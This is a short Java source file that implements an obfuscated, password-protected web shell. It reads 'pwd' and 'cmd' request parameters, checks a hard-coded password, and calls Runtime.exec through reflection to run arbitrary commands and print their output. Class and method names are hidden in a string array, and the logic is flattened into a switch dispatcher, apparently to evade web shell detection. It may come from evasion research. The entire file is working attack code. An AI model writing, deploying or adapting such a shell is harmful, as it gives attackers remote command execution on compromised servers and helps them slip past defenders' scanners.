package org.sec.util;

import java.lang.reflect.Method;

public class base {

    public static void main(String[] args) {
        try {
            String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9","pwd","cmd","java.lang.Runtime",
                    "getRuntime","exec","<pre>","</pre>"};
            String temp = globalArr[0];
            String[] b = temp.split("\\|");
            int index = 0;
            String passwd = null;
            String cmd = null;
            Class rt = null;
            Method gr = null;
            Method ex = null;
            Process process = null;
            java.io.InputStream in = null;
            byte bytes[] = null;
            while (true) {
                int op = Integer.parseInt(b[index++]);
                switch (op) {
                    case 0:
                        passwd = request.getParameter(globalArr[1]);
                        break;
                    case 1:
                        cmd = request.getParameter(globalArr[2]);
                        break;
                    case 2:
                        if (!passwd.equals("4ra1n")) {
                            return;
                        }
                    case 3:
                        rt =  Class.forName(globalArr[3]);
                        gr = rt.getMethod(globalArr[4]);
                        ex = rt.getMethod(globalArr[5], String.class);
                        break;
                    case 4:
                        process = (Process) ex.invoke(gr.invoke(null),  cmd);
                        break;
                    case 5:
                        in = process.getInputStream();
                        break;
                    case 6:
                        bytes = new byte[2048];
                        break;
                    case 7:
                        out.print(globalArr[6]);
                        break;
                    case 8:
                        while ((in.read(bytes)) != -1) {
                            out.println(new String(bytes));
                        }
                        break;
                    case 9:
                        out.print(globalArr[7]);
                }
            }
        } catch (Exception ignored) {

        }
    }
}